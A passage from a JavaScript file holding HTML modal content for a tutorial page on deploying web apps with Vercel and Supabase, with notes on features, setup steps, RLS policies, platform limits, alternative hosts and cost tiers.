                            <li><strong>Performance</strong> — Automatic caching at edge</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Edge Functions</h4>
                        <p>Run code at the edge (not just cache). Middleware, A/B testing, geolocation — all with sub-millisecond cold starts.</p>
                    </div>
                `
            },
            'vercel-preview': {
                title: 'Vercel Preview Deployments',
                body: `
                    <p>Every pull request automatically gets a unique, shareable preview URL.</p>
                    <div class="modal-section">
                        <h4>Workflow</h4>
                        <ul>
                            <li><strong>Open PR</strong> — Vercel builds and deploys</li>
                            <li><strong>Share URL</strong> — Stakeholders can review live</li>
                            <li><strong>Iterate</strong> — Each push updates the preview</li>
                            <li><strong>Merge</strong> — Merging to main deploys to production</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Comments</h4>
                        <p>Vercel integrates with GitHub/GitLab to post preview links directly on PRs. Team can review without running locally.</p>
                    </div>
                `
            },
            'vercel-serverless': {
                title: 'Vercel Serverless Functions',
                body: `
                    <p>API routes in your Next.js app automatically become serverless functions.</p>
                    <div class="modal-section">
                        <h4>How It Works</h4>
                        <ul>
                            <li><strong>pages/api/*</strong> or <strong>app/api/*</strong> → Serverless functions</li>
                            <li><strong>Edge Functions</strong> — Run at edge with edge runtime</li>
                            <li><strong>Scaling</strong> — 0 to millions, automatic</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Limits (Pro Plan)</h4>
                        <p>60 second timeout, 1GB memory, 4.5MB response size. Enough for most APIs.</p>
                    </div>
                `
            },

            // Vercel Tutorial Steps
            'vercel-step1': {
                title: 'Step 1: Connect GitHub',
                body: `
                    <p>Link your GitHub account to Vercel for automatic deployments.</p>
                    <div class="modal-section">
                        <h4>Process</h4>
                        <ol>
                            <li>Go to vercel.com and sign up/sign in</li>
                            <li>Click "Import Project"</li>
                            <li>Connect your GitHub account</li>
                            <li>Select the repository to import</li>
                        </ol>
                    </div>
                    <div class="modal-section">
                        <h4>Permissions</h4>
                        <p>Vercel needs read access to your repo and webhook access to trigger deploys. You can limit to specific repos.</p>
                    </div>
                `
            },
            'vercel-step2': {
                title: 'Step 2: Configure Settings',
                body: `
                    <p>Usually Vercel auto-detects everything, but you can customize.</p>
                    <div class="modal-section">
                        <h4>Common Settings</h4>
                        <ul>
                            <li><strong>Framework Preset</strong> — Auto-detected, override if needed</li>
                            <li><strong>Build Command</strong> — npm run build (usually auto)</li>
                            <li><strong>Output Directory</strong> — .next, dist, build (auto)</li>
                            <li><strong>Environment Variables</strong> — API keys, secrets</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Env Var Scopes</h4>
                        <p>Production, Preview, Development — different values for different environments. NEXT_PUBLIC_ prefix for client-side vars.</p>
                    </div>
                `
            },
            'vercel-step3': {
                title: 'Step 3: Deploy',
                body: `
                    <p>Click Deploy and watch the magic happen.</p>
                    <div class="modal-section">
                        <h4>What Vercel Does</h4>
                        <ol>
                            <li>Clones your repo</li>
                            <li>Installs dependencies</li>
                            <li>Runs build command</li>
                            <li>Uploads to edge network</li>
                            <li>Provisions SSL certificate</li>
                            <li>Routes your domain</li>
                        </ol>
                    </div>
                    <div class="modal-section">
                        <h4>Result</h4>
                        <p>You get: your-project.vercel.app (free subdomain) + custom domain support + automatic HTTPS.</p>
                    </div>
                `
            },
            'vercel-step4': {
                title: 'Step 4: Iterate',
                body: `
                    <p>From now on, every git push triggers a new deployment.</p>
                    <div class="modal-section">
                        <h4>Workflow</h4>
                        <ul>
                            <li><strong>Push to main</strong> → Production deploy</li>
                            <li><strong>Push to branch</strong> → Preview deploy</li>
                            <li><strong>Open PR</strong> → Preview URL posted to PR</li>
                            <li><strong>Merge PR</strong> → Auto-deploys to production</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Rollback</h4>
                        <p>Made a mistake? Click any previous deployment in the dashboard and promote it to production. Instant rollback.</p>
                    </div>
                `
            },

            // Vercel Code
            'vercel-api-code': {
                title: 'Vercel API Routes',
                body: `
                    <p>Next.js API routes become Vercel Serverless Functions automatically.</p>
                    <div class="modal-section">
                        <h4>File Structure</h4>
                        <ul>
                            <li><strong>pages/api/users.ts</strong> → /api/users</li>
                            <li><strong>pages/api/users/[id].ts</strong> → /api/users/:id</li>
                            <li><strong>app/api/users/route.ts</strong> → /api/users (App Router)</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Best Practices</h4>
                        <ul>
                            <li>Validate input (zod, yup)</li>
                            <li>Return appropriate status codes</li>
                            <li>Use try/catch for error handling</li>
                            <li>Keep functions focused and small</li>
                        </ul>
                    </div>
                `
            },

            // Vercel Limitations
            'vercel-limit-longrun': {
                title: 'Vercel: Long-Running Processes',
                body: `
                    <p>Vercel functions have timeouts — they're not for long-running tasks.</p>
                    <div class="modal-section">
                        <h4>Timeout Limits</h4>
                        <ul>
                            <li><strong>Hobby</strong> — 10 seconds</li>
                            <li><strong>Pro</strong> — 60 seconds</li>
                            <li><strong>Enterprise</strong> — 900 seconds</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Alternatives</h4>
                        <ul>
                            <li><strong>Background Jobs</strong> — Use Inngest, Trigger.dev</li>
                            <li><strong>WebSockets</strong> — Use Pusher, Ably, Supabase Realtime</li>
                            <li><strong>Long Compute</strong> — Use Railway, Render, AWS</li>
                        </ul>
                    </div>
                `
            },
            'vercel-limit-compute': {
                title: 'Vercel: Heavy Compute',
                body: `
                    <p>Serverless functions aren't designed for CPU-intensive tasks.</p>
                    <div class="modal-section">
                        <h4>Bad Fits</h4>
                        <ul>
                            <li><strong>Video Processing</strong> — Use dedicated media services</li>
                            <li><strong>ML Inference</strong> — Use Modal, Replicate, AWS</li>
                            <li><strong>Data Processing</strong> — Use dedicated compute</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Pattern</h4>
                        <p>Use Vercel for the web layer, offload heavy work to specialized services. Queue the job, return immediately, notify when done.</p>
                    </div>
                `
            },
            'vercel-limit-db': {
                title: 'Vercel: Database Hosting',
                body: `
                    <p>Vercel hosts your app, not your database. You need a separate database provider.</p>
                    <div class="modal-section">
                        <h4>Recommended Databases</h4>
                        <ul>
                            <li><strong>Supabase</strong> — Postgres + auth + storage</li>
                            <li><strong>PlanetScale</strong> — Serverless MySQL, branching</li>
                            <li><strong>Neon</strong> — Serverless Postgres, branching</li>
                            <li><strong>Vercel KV/Postgres</strong> — Vercel's own (Redis, Postgres)</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Connection Pooling</h4>
                        <p>Serverless = many short connections. Use connection pooling (Prisma Accelerate, PgBouncer) to avoid exhausting DB connections.</p>
                    </div>
                `
            },
            'vercel-limit-cost': {
                title: 'Vercel: Cost at Scale',
                body: `
                    <p>Vercel is cost-effective for small/medium apps, but can get expensive at high traffic.</p>
                    <div class="modal-section">
                        <h4>Pricing Factors</h4>
                        <ul>
                            <li><strong>Bandwidth</strong> — $40/100GB after free tier</li>
                            <li><strong>Function Invocations</strong> — $0.60/million</li>
                            <li><strong>Build Minutes</strong> — 100 hours Pro, then $0.008/min</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>When to Consider Alternatives</h4>
                        <p>If you're spending >$1000/month on Vercel, evaluate self-hosting or AWS. But at that scale, you probably have revenue to justify it.</p>
                    </div>
                `
            },

            // Supabase
            'supabase-postgres': {
                title: 'Supabase PostgreSQL',
                body: `
                    <p>Full PostgreSQL database — not a subset or emulation, the real thing.</p>
                    <div class="modal-section">
                        <h4>Features</h4>
                        <ul>
                            <li><strong>Full Postgres</strong> — Any Postgres feature works</li>
                            <li><strong>40+ Extensions</strong> — pgvector, PostGIS, pg_cron</li>
                            <li><strong>Direct Access</strong> — Connect with psql, pgAdmin</li>
                            <li><strong>Backups</strong> — Daily backups, point-in-time recovery</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Not Locked In</h4>
                        <p>It's standard Postgres. Export and run anywhere. No proprietary syntax.</p>
                    </div>
                `
            },
            'supabase-auth': {
                title: 'Supabase Authentication',
                body: `
                    <p>Complete auth solution — users, sessions, social login, all managed.</p>
                    <div class="modal-section">
                        <h4>Supported Methods</h4>
                        <ul>
                            <li><strong>Email/Password</strong> — Classic signup/login</li>
                            <li><strong>Magic Links</strong> — Passwordless email</li>
                            <li><strong>OAuth</strong> — Google, GitHub, Discord, etc.</li>
                            <li><strong>Phone/SMS</strong> — OTP via SMS</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Integrated with RLS</h4>
                        <p>auth.uid() in RLS policies automatically references the current user. Auth and data security work together.</p>
                    </div>
                `
            },
            'supabase-storage': {
                title: 'Supabase Storage',
                body: `
                    <p>S3-compatible file storage with CDN and image transformations.</p>
                    <div class="modal-section">
                        <h4>Features</h4>
                        <ul>
                            <li><strong>Buckets</strong> — Organize files (public/private)</li>
                            <li><strong>CDN</strong> — Fast delivery globally</li>
                            <li><strong>Transformations</strong> — Resize images on-the-fly</li>
                            <li><strong>RLS</strong> — Control access per file/folder</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Use Cases</h4>
                        <p>User avatars, file uploads, image galleries. No need for separate S3 setup.</p>
                    </div>
                `
            },
            'supabase-realtime': {
                title: 'Supabase Realtime',
                body: `
                    <p>Subscribe to database changes over WebSocket — instant updates when data changes.</p>
                    <div class="modal-section">
                        <h4>Types</h4>
                        <ul>
                            <li><strong>Postgres Changes</strong> — Listen to INSERT/UPDATE/DELETE</li>
                            <li><strong>Broadcast</strong> — Pub/sub for ephemeral messages</li>
                            <li><strong>Presence</strong> — Track online users</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Use Cases</h4>
                        <p>Chat apps, live dashboards, collaborative editing, notifications — anything that needs instant updates.</p>
                    </div>
                `
            },
            'supabase-edge': {
                title: 'Supabase Edge Functions',
                body: `
                    <p>Serverless functions running on Deno at the edge.</p>
                    <div class="modal-section">
                        <h4>Use Cases</h4>
                        <ul>
                            <li><strong>Webhooks</strong> — Process Stripe, GitHub events</li>
                            <li><strong>API Integrations</strong> — Call external APIs</li>
                            <li><strong>Custom Logic</strong> — Validation, transformations</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Deno Runtime</h4>
                        <p>TypeScript native, Web APIs, secure by default. Different from Node.js but similar enough.</p>
                    </div>
                `
            },

            // Supabase Setup
            'supabase-setup1': {
                title: 'Supabase: Create Project',
                body: `
                    <p>Set up a new Supabase project in under a minute.</p>
                    <div class="modal-section">
                        <h4>Steps</h4>
                        <ol>
                            <li>Go to supabase.com</li>
                            <li>Sign in with GitHub</li>
                            <li>Click "New Project"</li>
                            <li>Choose organization</li>
                            <li>Set project name and database password</li>
                            <li>Select region (close to your users)</li>
                        </ol>
                    </div>
                    <div class="modal-section">
                        <h4>Important</h4>
                        <p>Save your database password! You'll need it for direct connections. The anon key is safe to expose publicly.</p>
                    </div>
                `
            },
            'supabase-setup2': {
                title: 'Supabase: Install Client',
                body: `
                    <p>Add the Supabase JavaScript client to your project.</p>
                    <div class="modal-section">
                        <h4>Installation</h4>
                        <pre><code>npm install @supabase/supabase-js</code></pre>
                    </div>
                    <div class="modal-section">
                        <h4>Other SDKs</h4>
                        <ul>
                            <li><strong>Python</strong> — supabase-py</li>
                            <li><strong>Flutter</strong> — supabase_flutter</li>
                            <li><strong>Swift</strong> — supabase-swift</li>
                            <li><strong>Kotlin</strong> — supabase-kt</li>
                        </ul>
                    </div>
                `
            },
            'supabase-setup3': {
                title: 'Supabase: Initialize Client',
                body: `
                    <p>Create and configure the Supabase client instance.</p>
                    <div class="modal-section">
                        <h4>Configuration</h4>
                        <ul>
                            <li><strong>URL</strong> — Your project URL (Settings → API)</li>
                            <li><strong>Anon Key</strong> — Public key (safe to expose)</li>
                            <li><strong>Service Role Key</strong> — Admin key (server-side only!)</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Next.js Pattern</h4>
                        <p>Create separate clients for client-side (anon key) and server-side (service role for admin ops). Supabase docs have templates.</p>
                    </div>
                `
            },
            'supabase-setup4': {
                title: 'Supabase: Start Using',
                body: `
                    <p>Query database, authenticate users, upload files — all from one client.</p>
                    <div class="modal-section">
                        <h4>Quick Examples</h4>
                        <pre><code>// Database
supabase.from('users').select('*')

// Auth
supabase.auth.signInWithOAuth({ provider: 'google' })

// Storage
supabase.storage.from('avatars').upload(path, file)</code></pre>
                    </div>
                    <div class="modal-section">
                        <h4>Type Safety</h4>
                        <p>Generate TypeScript types from your database schema: <code>supabase gen types typescript</code></p>
                    </div>
                `
            },

            // Supabase Code
            'supabase-queries-code': {
                title: 'Supabase Query API',
                body: `
                    <p>Supabase provides a chainable query builder that covers most SQL operations.</p>
                    <div class="modal-section">
                        <h4>Query Features</h4>
                        <ul>
                            <li><strong>Filters</strong> — eq, neq, gt, lt, like, in, is</li>
                            <li><strong>Joins</strong> — Nested selects for relations</li>
                            <li><strong>Aggregates</strong> — count(), sum() via postgrest</li>
                            <li><strong>Full Text Search</strong> — textSearch() method</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Raw SQL</h4>
                        <p>Need complex queries? Use <code>supabase.rpc('function_name', params)</code> to call Postgres functions.</p>
                    </div>
                `
            },
            'supabase-auth-code': {
                title: 'Supabase Auth Code',
                body: `
                    <p>Complete authentication flows with just a few lines of code.</p>
                    <div class="modal-section">
                        <h4>Session Management</h4>
                        <ul>
                            <li><strong>Automatic</strong> — Tokens refreshed automatically</li>
                            <li><strong>Persistent</strong> — Sessions survive page reload</li>
                            <li><strong>Events</strong> — Listen to auth state changes</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Example: Auth State</h4>
                        <pre><code>supabase.auth.onAuthStateChange((event, session) => {
  if (event === 'SIGNED_IN') console.log('Welcome!', session.user)
  if (event === 'SIGNED_OUT') console.log('Goodbye!')
})</code></pre>
                    </div>
                `
            },
            'supabase-rls': {
                title: 'Row Level Security (RLS)',
                body: `
                    <p>RLS lets you define access rules at the database level — security that can't be bypassed.</p>
                    <div class="modal-section">
                        <h4>Why RLS Matters</h4>
                        <ul>
                            <li><strong>Defense in Depth</strong> — Even if API is compromised, data is protected</li>
                            <li><strong>Simple API</strong> — No need for auth checks in every endpoint</li>
                            <li><strong>Consistent</strong> — Rules apply everywhere, no exceptions</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Common Patterns</h4>
                        <p>Users see own data: <code>USING (auth.uid() = user_id)</code><br>
                        Org members see org data: <code>USING (org_id IN (SELECT org_id FROM memberships WHERE user_id = auth.uid()))</code></p>
                    </div>
                `
            },
            'supabase-rls-code': {
                title: 'RLS Policy Examples',
                body: `
                    <p>Common RLS policy patterns for securing your data.</p>
                    <div class="modal-section">
                        <h4>Policy Structure</h4>
                        <ul>
                            <li><strong>FOR SELECT/INSERT/UPDATE/DELETE</strong> — Which operation</li>
                            <li><strong>USING</strong> — Filter for existing rows (SELECT, UPDATE, DELETE)</li>
                            <li><strong>WITH CHECK</strong> — Validate new rows (INSERT, UPDATE)</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Pro Tips</h4>
                        <ul>
                            <li>Always enable RLS on tables with user data</li>
                            <li>Test policies in SQL editor before deploying</li>
                            <li>Use service_role key to bypass RLS for admin tasks</li>
                        </ul>
                    </div>
                `
            },

            // Supabase Limitations
            'supabase-limit-scale': {
                title: 'Supabase: Scaling Limits',
                body: `
                    <p>Supabase runs on a single Postgres instance per project, which has inherent limits.</p>
                    <div class="modal-section">
                        <h4>Scaling Strategies</h4>
                        <ul>
                            <li><strong>Read Replicas</strong> — Coming soon, offload reads</li>
                            <li><strong>Connection Pooling</strong> — PgBouncer built-in</li>
                            <li><strong>Vertical Scaling</strong> — Upgrade to larger instance</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>When to Look Elsewhere</h4>
                        <p>If you need global writes (not just reads), horizontal sharding, or millions of concurrent connections — consider CockroachDB, Spanner, or custom sharding.</p>
                    </div>
                `
            },
            'supabase-limit-complex': {
                title: 'Supabase: Complex Backend Logic',
                body: `
                    <p>Edge Functions have limits — they're not a replacement for a full backend.</p>
                    <div class="modal-section">
                        <h4>Edge Function Limits</h4>
                        <ul>
                            <li><strong>Timeout</strong> — 60 seconds</li>
                            <li><strong>Memory</strong> — 150MB</li>
                            <li><strong>No Background Jobs</strong> — Function ends when request ends</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Alternatives</h4>
                        <p>For complex backends: use Railway/Render for a traditional server, or AWS/GCP for specific services. Supabase for data, custom backend for logic.</p>
                    </div>
                `
            },
            'supabase-limit-nosql': {
                title: 'Supabase: Document Workloads',
                body: `
                    <p>Supabase is PostgreSQL — great for relational data, less natural for documents.</p>
                    <div class="modal-section">
                        <h4>Postgres JSONB</h4>
                        <ul>
                            <li><strong>JSON Columns</strong> — Store flexible data</li>
                            <li><strong>JSONB Indexes</strong> — Query JSON efficiently</li>
                            <li><strong>Not MongoDB</strong> — Different query patterns</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>When to Use NoSQL</h4>
                        <p>If your data is truly schemaless, highly nested, or you need MongoDB-style queries — consider MongoDB Atlas or Fauna.</p>
                    </div>
                `
            },
            'supabase-limit-vendor': {
                title: 'Supabase: Vendor Lock-in',
                body: `
                    <p>Supabase is open source — you can self-host everything.</p>
                    <div class="modal-section">
                        <h4>Open Source Stack</h4>
                        <ul>
                            <li><strong>PostgreSQL</strong> — Standard database</li>
                            <li><strong>PostgREST</strong> — Auto-generated REST API</li>
                            <li><strong>GoTrue</strong> — Auth server</li>
                            <li><strong>Realtime</strong> — WebSocket server</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Migration Path</h4>
                        <p>Export your database, run Supabase stack on your own infrastructure. It's Postgres — any Postgres tool works.</p>
                    </div>
                `
            },

            // Stack Benefits
            'stack-benefit-cost': {
                title: 'Free to Start',
                body: `
                    <p>Both Vercel and Supabase have generous free tiers — launch without spending anything.</p>
                    <div class="modal-section">
                        <h4>Vercel Free Tier</h4>
                        <ul>
                            <li>100GB bandwidth/month</li>
                            <li>100K function invocations</li>
                            <li>Unlimited deploys</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Supabase Free Tier</h4>
                        <ul>
                            <li>500MB database</li>
                            <li>1GB storage</li>
                            <li>2GB bandwidth</li>
                            <li>500K edge function invocations</li>
                        </ul>
                    </div>
                `
            },
            'stack-benefit-scale': {
                title: 'Scales Automatically',
                body: `
                    <p>No capacity planning — both platforms handle scaling for you.</p>
                    <div class="modal-section">
                        <h4>Vercel Scaling</h4>
                        <ul>
                            <li>Edge network handles traffic spikes</li>
                            <li>Serverless functions scale to demand</li>
                            <li>No cold start for static assets</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Supabase Scaling</h4>
                        <ul>
                            <li>Connection pooling handles many clients</li>
                            <li>Upgrade instance size as you grow</li>
                            <li>Read replicas for read-heavy workloads</li>
                        </ul>
                    </div>
                `
            },
            'stack-benefit-dx': {
                title: 'Great Developer Experience',
                body: `
                    <p>Both platforms prioritize making developers productive and happy.</p>
                    <div class="modal-section">
                        <h4>DX Features</h4>
                        <ul>
                            <li><strong>Git Integration</strong> — Push to deploy</li>
                            <li><strong>Local Development</strong> — Supabase CLI, Vercel CLI</li>
                            <li><strong>TypeScript</strong> — First-class support</li>
                            <li><strong>Previews</strong> — Test before merging</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Documentation</h4>
                        <p>Both have excellent docs, tutorials, and examples. You'll rarely get stuck.</p>
                    </div>
                `
            },
            'stack-benefit-speed': {
                title: 'Ship Fast',
                body: `
                    <p>Focus on your product, not infrastructure. Go from idea to production in hours.</p>
                    <div class="modal-section">
                        <h4>What You Skip</h4>
                        <ul>
                            <li>Server provisioning</li>
                            <li>SSL certificate management</li>
                            <li>Database setup and backups</li>
                            <li>Auth implementation</li>
                            <li>CI/CD pipeline configuration</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Reality</h4>
                        <p>A competent developer can ship a complete SaaS MVP in a weekend. That wasn't possible 5 years ago.</p>
                    </div>
                `
            },

            // Full Stack Example
            'fullstack-example': {
                title: 'Full Stack Todo App',
                body: `
                    <p>Complete example combining Next.js + Supabase for a realtime todo app.</p>
                    <div class="modal-section">
                        <h4>What This Code Does</h4>
                        <ul>
                            <li><strong>Initial Load</strong> — Fetches existing todos</li>
                            <li><strong>Realtime</strong> — Subscribes to changes</li>
                            <li><strong>Create</strong> — Adds todos with user association</li>
                            <li><strong>Cleanup</strong> — Removes subscription on unmount</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Add RLS</h4>
                        <p>With RLS enabled, each user only sees their own todos — even if someone manipulates the client code.</p>
                    </div>
                `
            },

            // Platform Cards
            'platform-railway': {
                title: 'Railway',
                body: `
                    <p>Deploy anything from GitHub — apps, databases, cron jobs, all managed.</p>
                    <div class="modal-section">
                        <h4>Key Features</h4>
                        <ul>
                            <li><strong>Instant Deploys</strong> — Push to deploy any language</li>
                            <li><strong>Databases</strong> — Postgres, MySQL, Redis, MongoDB</li>
                            <li><strong>Private Networking</strong> — Services communicate internally</li>
                            <li><strong>Cron Jobs</strong> — Scheduled tasks built-in</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Best For</h4>
                        <p>Full-stack apps that need more than serverless — long-running processes, WebSockets, custom backends.</p>
                    </div>
                `
            },
            'platform-render': {
                title: 'Render',
                body: `
                    <p>Cloud platform for developers — services, static sites, Postgres, all in one.</p>
                    <div class="modal-section">
                        <h4>Key Features</h4>
                        <ul>
                            <li><strong>Web Services</strong> — Docker or native runtimes</li>
                            <li><strong>Static Sites</strong> — Free, fast, CDN-backed</li>
                            <li><strong>Postgres</strong> — Managed with backups</li>
                            <li><strong>Background Workers</strong> — Process queues</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Best For</h4>
                        <p>Teams wanting Heroku-like simplicity with modern features and better pricing.</p>
                    </div>
                `
            },
            'platform-fly': {
                title: 'Fly.io',
                body: `
                    <p>Run apps at the edge — containers deployed globally in seconds.</p>
                    <div class="modal-section">
                        <h4>Key Features</h4>
                        <ul>
                            <li><strong>Global by Default</strong> — Deploy to multiple regions</li>
                            <li><strong>Machines API</strong> — Start/stop VMs programmatically</li>
                            <li><strong>Postgres</strong> — Distributed Postgres (LiteFS for SQLite)</li>
                            <li><strong>GPUs</strong> — ML inference at the edge</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Best For</h4>
                        <p>Apps that need to run close to users globally — chat, gaming, real-time collaboration.</p>
                    </div>
                `
            },
            'platform-cloudflare': {
                title: 'Cloudflare',
                body: `
                    <p>The connectivity cloud — CDN, Workers, databases, storage, all at the edge.</p>
                    <div class="modal-section">
                        <h4>Key Services</h4>
                        <ul>
                            <li><strong>Workers</strong> — Serverless at 300+ edge locations</li>
                            <li><strong>D1</strong> — SQLite at the edge</li>
                            <li><strong>R2</strong> — S3-compatible storage, no egress fees</li>
                            <li><strong>KV</strong> — Key-value storage, globally distributed</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Best For</h4>
                        <p>Edge-first applications, static sites with dynamic elements, API proxies, anything latency-sensitive.</p>
                    </div>
                `
            },
            'platform-planetscale': {
                title: 'PlanetScale',
                body: `
                    <p>Serverless MySQL built on Vitess — the technology that powers YouTube.</p>
                    <div class="modal-section">
                        <h4>Key Features</h4>
                        <ul>
                            <li><strong>Branching</strong> — Database branches like git branches</li>
                            <li><strong>Non-blocking Schema Changes</strong> — No downtime deploys</li>
                            <li><strong>Serverless</strong> — Scale to zero, scale to massive</li>
                            <li><strong>Insights</strong> — Query analytics built-in</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Best For</h4>
                        <p>MySQL workloads that need to scale, teams that want database CI/CD with branches.</p>
                    </div>
                `
            },
            'platform-neon': {
                title: 'Neon',
                body: `
                    <p>Serverless Postgres — instant branching, scale to zero, bottomless storage.</p>
                    <div class="modal-section">
                        <h4>Key Features</h4>
                        <ul>
                            <li><strong>Branching</strong> — Instant database copies</li>
                            <li><strong>Scale to Zero</strong> — Pay nothing when idle</li>
                            <li><strong>Autoscaling</strong> — Compute scales with load</li>
                            <li><strong>Time Travel</strong> — Query past data points</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Best For</h4>
                        <p>Postgres users who want serverless pricing, development workflows with database branches.</p>
                    </div>
                `
            },

            // Stack Decision
            'stack-frontend': {
                title: 'Frontend / Marketing Stack',
                body: `
                    <p>For static sites, marketing pages, and frontend-only applications.</p>
                    <div class="modal-section">
                        <h4>Recommended: Vercel or Netlify</h4>
                        <ul>
                            <li>Zero-config deploys</li>
                            <li>Global CDN</li>
                            <li>Form handling</li>
                            <li>Analytics</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Also Consider</h4>
                        <p>Cloudflare Pages (free, fast, R2 integration) or GitHub Pages (simple, free).</p>
                    </div>
                `
            },
            'stack-fullstack': {
                title: 'Full-Stack SaaS Stack',
                body: `
                    <p>For complete web applications with auth, database, and API.</p>
                    <div class="modal-section">
                        <h4>Recommended: Vercel + Supabase</h4>
                        <ul>
                            <li>Frontend + Serverless API (Vercel)</li>
                            <li>Database + Auth + Storage (Supabase)</li>
                            <li>Realtime built-in</li>
                            <li>Free to start, scales well</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Also Consider</h4>
                        <p>Next.js + Clerk (auth) + PlanetScale/Neon (database) for more control over auth.</p>
                    </div>
                `
            },
            'stack-backend': {
                title: 'Custom Backend Stack',
                body: `
                    <p>When you need full control over your server environment.</p>
                    <div class="modal-section">
                        <h4>Recommended: Railway or Render</h4>
                        <ul>
                            <li>Deploy any Docker container</li>
                            <li>Managed databases</li>
                            <li>Background jobs</li>
                            <li>WebSocket support</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>When to Use</h4>
                        <p>Long-running processes, custom runtimes, WebSocket servers, queue workers — anything serverless can't do.</p>
                    </div>
                `
            },
            'stack-global': {
                title: 'Global Low-Latency Stack',
                body: `
                    <p>For applications where latency matters — games, chat, real-time.</p>
                    <div class="modal-section">
                        <h4>Recommended: Fly.io or Cloudflare</h4>
                        <ul>
                            <li><strong>Fly.io</strong> — Full apps at edge</li>
                            <li><strong>Cloudflare Workers</strong> — Functions at edge</li>
                            <li><strong>Cloudflare D1/Durable Objects</strong> — State at edge</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Pattern</h4>
                        <p>Run compute close to users, replicate data to edge, accept eventual consistency for performance.</p>
                    </div>
                `
            },
            'stack-enterprise': {
                title: 'Enterprise / Complex Stack',
                body: `
                    <p>When you need full control, compliance, or scale beyond platform limits.</p>
                    <div class="modal-section">
                        <h4>Recommended: AWS / Azure / GCP</h4>
                        <ul>
                            <li>Complete service catalog</li>
                            <li>Compliance certifications</li>
                            <li>Enterprise support</li>
                            <li>Hybrid cloud options</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Reality</h4>
                        <p>Most startups don't need Big Three complexity. Start simple, migrate when you have the team and need.</p>
                    </div>
                `
            },

            // GitHub Features
            'github-preview': {
                title: 'Preview Deployments',
                body: `
                    <p>Every pull request gets its own unique URL for testing and review.</p>
                    <div class="modal-section">
                        <h4>Benefits</h4>
                        <ul>
                            <li><strong>Test Before Merge</strong> — QA on actual deployment</li>
                            <li><strong>Stakeholder Review</strong> — Share with non-developers</li>
                            <li><strong>Multiple Versions</strong> — Compare PRs side by side</li>
                            <li><strong>Automatic Cleanup</strong> — Deleted when PR closes</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Pro Tip</h4>
                        <p>Set up Slack/Discord notifications for preview URLs — team knows instantly when something is ready to review.</p>
                    </div>
                `
            },
            'github-rollback': {
                title: 'Instant Rollbacks',
                body: `
                    <p>Something broke in production? Roll back to any previous deployment in seconds.</p>
                    <div class="modal-section">
                        <h4>How It Works</h4>
                        <ul>
                            <li>Every deploy is immutable</li>
                            <li>Previous versions stay available</li>
                            <li>One click to promote old version</li>
                            <li>No rebuild required</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Best Practice</h4>
                        <p>Small, frequent deploys make rollbacks easier. If you deploy 10 features at once, you roll back 10 features.</p>
                    </div>
                `
            },
            'github-env': {
                title: 'Environment Branches',
                body: `
                    <p>Map git branches to deployment environments for structured workflows.</p>
                    <div class="modal-section">
                        <h4>Common Pattern</h4>
                        <ul>
                            <li><strong>main</strong> → production</li>
                            <li><strong>staging</strong> → staging environment</li>
                            <li><strong>feature/*</strong> → preview deployments</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Environment Variables</h4>
                        <p>Each environment can have different env vars — staging uses test API keys, production uses live keys.</p>
                    </div>
                `
            },

            // Cost Scenarios
            'cost-startup': {
                title: 'Startup Cost (0-1K users)',
                body: `
                    <p>Launch and validate your idea without spending anything on infrastructure.</p>
                    <div class="modal-section">
                        <h4>Free Tier Limits</h4>
                        <ul>
                            <li><strong>Vercel</strong> — 100GB bandwidth, plenty for small apps</li>
                            <li><strong>Supabase</strong> — 500MB database, 1GB storage</li>
                            <li><strong>Total</strong> — $0/month until you outgrow free tier</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Focus</h4>
                        <p>At this stage, your time is more valuable than server costs. Ship fast, validate, iterate.</p>
                    </div>
                `
            },
            'cost-growing': {
                title: 'Growing Cost (10K users)',
                body: `
                    <p>Upgrade to pro tiers for more resources and production features.</p>
                    <div class="modal-section">
                        <h4>Typical Costs</h4>
                        <ul>
                            <li><strong>Vercel Pro</strong> — $20/month base + usage</li>
